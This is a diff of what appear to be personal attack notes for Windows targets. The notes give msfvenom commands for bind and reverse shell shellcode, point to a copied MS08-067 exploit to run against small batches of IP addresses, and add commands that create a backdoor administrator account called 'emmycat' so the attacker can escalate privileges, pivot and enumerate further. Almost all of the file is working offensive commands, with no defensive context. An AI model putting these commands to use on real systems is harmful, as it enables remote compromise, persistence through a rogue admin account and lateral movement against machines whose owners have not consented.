@@ -1,4 +1,6 @@
-genpayload shellcode:
+#Noisy af, easy to spot from blueteam
+
+#genpayload shellcode:
 #sometimes works# msfvenom -p windows/shell_bind_tcp RHOST=YOUR-LOCALHOST LPORT=5150 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 #works best with winblows serv boxes# msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-localhost LPORT=5150 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 #works best with xp# msfvenom -p windows/shell_reverse_tcp LHOST=blork-mcgavin LPORT=5150 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
@@ -8,8 +10,13 @@ genpayload shellcode:
 
 #emmycat-ms08-067.py stolen from https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py, thx :3
 #5/french works great for any type of xp box
-#wait a minute after the script runs through a small list (around 10 ips) to see if the shell pops, esp with nc because its slow
 
+
+#wait a minute after the script runs through a small list (around 10 ips) to see if the shell pops, esp with nc because its slow
+#The msfvenom revsh's in NC will crash out with too much input, just build an account and try privesc then pivot
+net add user emmycat 5150kitten /add
+net localgroup administrators emmycat /add
+#Throw some win-fuzz cmds/dirs at it too, then go for enum4linux with creds
 
 
 
